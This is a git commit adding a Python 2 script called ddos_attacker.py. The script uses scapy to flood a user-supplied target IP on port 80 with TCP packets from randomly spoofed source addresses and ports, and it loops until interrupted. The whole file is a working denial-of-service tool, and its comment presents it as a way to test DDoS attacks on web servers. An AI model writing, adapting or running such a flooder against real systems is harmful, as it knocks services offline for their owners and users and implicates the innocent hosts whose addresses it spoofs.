22a8c87f4262ad909ff624d59a1a88ec0250ecc1
Mostafa-Samy-97 <51253114+Mostafa-Samy-97@users.noreply.github.com>
2020-01-07 23:04:58 -0500

    Add files via upload

---
+++ ddos_attacker.py
@@ -0,0 +1,42 @@
+#!usr/bin/env python  
+
+# ddos attacker Python Tool Version 1.0
+# Developed By Mostafa_Samy
+# Github Link ==>> https://github.com/Mostafa-Samy-97
+
+'''
+this tool will help you to test ddos attacks on web servers
+by sending huge amount of packets from random IPs and Multiple Ports
+'''
+
+from scapy.all import *
+import sys
+
+try :    
+    target = raw_input("\nEnter the Target IP > ")
+    i = 1 
+
+    while True :
+        a = str(random.randint(1,254))
+        b = str(random.randint(1,254))
+        c = str(random.randint(1,254))
+        d = str(random.randint(1,254))
+        dot = "."
+        src = a+dot+b+dot+c+dot+d
+        print src
+        st = random.randint(1,1000)
+        en = random.randint(1000,65535)
+        loop_break = 0
+        for srcport in range(st,en):
+            IP1 = IP(src=src, dst=target)
+            TCP1 = TCP(sport=srcport, dport=80)
+            pkt = IP1 / TCP1
+            send(pkt,inter= .0001)
+            print "packet sent ", i
+            loop_break = loop_break+1
+            i=i+1
+            if loop_break ==50 :
+                break
+
+except KeyboardInterrupt :
+    sys.exit(0)
